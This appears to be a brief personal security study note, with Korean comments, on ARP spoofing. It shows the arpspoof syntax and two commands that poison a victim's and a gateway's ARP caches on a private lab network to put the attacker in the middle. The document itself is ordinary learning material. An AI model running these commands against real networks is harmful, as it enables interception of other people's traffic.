# security ARP Spoofing arpspoof

```sh
# arpspoof -i [interface] -t [target ip] [gateway ip]

arpspoof -i eth0 -t 10.0.2.7 10.0.2.1 # victim에게 내가 access point라고 속임
arpspoof -i eth0 -t 10.0.2.1 10.0.2.7 # access point에게 내가 victim이라고 속임
```
